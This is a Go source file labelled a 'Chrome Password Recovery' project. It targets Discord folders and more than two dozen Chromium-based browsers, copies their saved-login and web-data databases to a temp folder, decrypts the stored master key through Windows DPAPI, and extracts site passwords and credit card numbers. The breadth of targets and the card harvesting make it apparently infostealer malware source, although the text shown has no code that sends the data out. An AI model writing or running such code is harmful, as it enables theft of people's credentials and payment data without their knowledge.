//Chrome Password Recovery project main.go
//Recover Websites, Username and Passwords from Google Chromes Login Data file.

//Windows Only

//SQLLite3 - github.com/mattn/go-sqlite3
//Using Crypt32.dll (win32crypt) for decryption

//C:\Users\{USERNAME}\AppData\Local\Google\Chrome\User Data\Default

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")

	masterKey []byte

	TempFileDir string = TEMP + "\\" + RandStringBytes(16)

	PLATFORMS = [27]PLATFORM{
		{Chromium: false,
			DataFiles: ROAMING + "\\discord"},
		{Chromium: false,
			DataFiles: ROAMING + "\\discordcanary"},
		{Chromium: false,
			DataFiles: ROAMING + "\\discordptb"},
		{Chromium: true,
			LocalState: ROAMING + "\\Opera Software\\Opera Stable\\Local State",
			DataFiles:  ROAMING + "\\Opera Software\\Opera Stable"},
		{Chromium: true,
			LocalState: LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
			DataFiles:  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
		{Chromium: true,
			LocalState: ROAMING + "\\Opera Software\\Opera GX Stable\\Local State",
			DataFiles:  ROAMING + "\\Opera Software\\Opera GX Stable"},
		{Chromium: true,
			LocalState: LOCAL + "\\Google\\Chrome\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Google\\Chrome\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Yandex\\YandexBrowser\\User \\Local State",
			DataFiles:  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Chromium\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Chromium\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Epic Privacy Browser\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Epic Privacy Browser\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Amigo\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Amigo\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Vivaldi\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Vivaldi\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Orbitum\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Orbitum\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Mail.Ru\\Atom\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Mail.Ru\\Atom\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Kometa\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Kometa\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Comodo\\Dragon\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Comodo\\Dragon\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Torch\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Torch\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Comodo\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Comodo\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Slimjet\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Slimjet\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\360Browser\\Browser\\User Data\\Local State",
			DataFiles:  LOCAL + "\\360Browser\\Browser\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Maxthon3\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Maxthon3\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\K-Meleon\\User Data\\Local State",
			DataFiles:  LOCAL + "\\K-Meleon\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Sputnik\\Sputnik\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Sputnik\\Sputnik\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Nichrome\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Nichrome\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\CocCoc\\Browser\\User Data\\Local State",
			DataFiles:  LOCAL + "\\CocCoc\\Browser\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\uCozMedia\\Uran\\User Data\\Local State",
			DataFiles:  LOCAL + "\\uCozMedia\\Uran\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Chromodo\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Chromodo\\User Data\\Default"},
	}
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

type PLATFORM struct {
	Chromium   bool
	LocalState string
	DataFiles  string
}

type PASSWD struct {
	url  string
	user string
	pass string
}

type CCARD struct {
	Name       string
	Number     string
	Expiration string
}

type WEBSITE struct {
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	if _, err := os.Stat(TempFileDir); os.IsNotExist(err) {
		os.MkdirAll(TempFileDir, 0700)
	}

	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

func FileExists(filePath string) bool {
	_, err := os.OpenFile(filePath, os.O_RDWR, 0666)
	if errors.Is(err, os.ErrNotExist) {
		return false
	} else {
		return true
	}
}

func getMasterKey(localStatePath string) ([]byte, error) {

	var masterKey []byte

	// Get the master key
	// The master key is the key with which chrome encode the passwords but it has some suffixes and we need to work on it
	jsonFile, err := os.Open(localStatePath) // The rough key is stored in the Local State File which is a json file
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteValue), &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) // Found parsing the json in it
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)                      // It's stored in Base64 so.. Let's decode it
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI") // The key is encrypted using the windows DPAPI method and signed with it. the key looks like "DPAPI05546sdf879z456..." Let's Remove DPAPI.

	masterKey, err = Decrypt([]byte(stringKey)) // Decrypt the key using the dllcrypt32 dll.
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil

}

func DecryptBlob(BLOB string, LocalState string) string {
	var output string

	if strings.HasPrefix(BLOB, "v10") { // Means it's Chrome v80 or higher
		BLOB = strings.Trim(BLOB, "v10")

		if string(masterKey) == "" { // It the masterkey hasn't been requested yet, then gets it.
			mkey, err := getMasterKey(LocalState)
			if err != nil {
				fmt.Println(err)
			}
			masterKey = mkey
		}

		ciphertext := []byte(BLOB)
		c, err := aes.NewCipher(masterKey)
		if err != nil {

			fmt.Println(err)
		}
		gcm, err := cipher.NewGCM(c)
		if err != nil {
			fmt.Println(err)
		}
		nonceSize := gcm.NonceSize()
		if len(ciphertext) < nonceSize {
			fmt.Println(err)
		}

		nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
		plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			fmt.Println(err)
		}
		if string(plaintext) != "" {
			output = string(plaintext)

		}
	} else { //Means it's chrome v. < 80
		pass, err := Decrypt([]byte(BLOB))
		if err != nil {
			log.Fatal(err)
		}

		output = string(pass)
	}

	return output
}

func GetCreditCards() []CCARD {

	var output []CCARD

	for _, Path := range PLATFORMS {

		if !Path.Chromium || !FileExists(Path.LocalState) || !FileExists(Path.DataFiles+"\\Web Data") {
			continue
		}

		var TempFileName string = RandStringBytes(8)

		//Copy Login Data file to temp location
		err := copyFileToDirectory(Path.DataFiles+"\\Web Data", TempFileDir+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}

		//Open Database
		db, err := sql.Open("sqlite3", TempFileDir+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}
		defer db.Close()

		//Select Rows to get data from
		rows, err := db.Query("select name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
		if err != nil {
			log.Fatal(err)
		}
		defer rows.Close()

		for rows.Next() {
			var NAME string
			var EXPM string
			var EXPY string
			var NUMBER string

			err = rows.Scan(&NAME, &EXPM, &EXPY, &NUMBER)
			if err != nil {
				log.Fatal(err)
			}

			NUMBER = DecryptBlob(NUMBER, Path.LocalState)

			if NUMBER != "" {
				output = append(output, CCARD{
					Name:       NAME,
					Expiration: fmt.Sprintf("%s/%s", EXPM, EXPY),
					Number:     NUMBER,
				})
			}
		}

		err = rows.Err()
		if err != nil {
			log.Fatal(err)
		}

	}

	return output
}

func GetPasswords() []PASSWD {

	var output []PASSWD

	for _, Path := range PLATFORMS {

		if !Path.Chromium || !FileExists(Path.LocalState) || !FileExists(Path.DataFiles+"\\Login Data") {
			continue
		}

		var TempFileName string = RandStringBytes(8)

		//Copy Login Data file to temp location
		err := copyFileToDirectory(Path.DataFiles+"\\Login Data", TempFileDir+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}

		//Open Database
		db, err := sql.Open("sqlite3", TempFileDir+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}
		defer db.Close()

		//Select Rows to get data from
		rows, err := db.Query("select origin_url, username_value, password_value from logins")
		if err != nil {
			log.Fatal(err)
		}
		defer rows.Close()

		for rows.Next() {
			var URL string
			var USERNAME string
			var PASSWORD string

			err = rows.Scan(&URL, &USERNAME, &PASSWORD)
			if err != nil {
				log.Fatal(err)
			}

			PASSWORD = DecryptBlob(PASSWORD, Path.LocalState)

			if PASSWORD != "" {
				output = append(output, PASSWD{
					url:  URL,
					user: USERNAME,
					pass: PASSWORD,
				})
			}
		}

		err = rows.Err()
		if err != nil {
			log.Fatal(err)
		}

		masterKey = []byte("")
	}

	return output
}
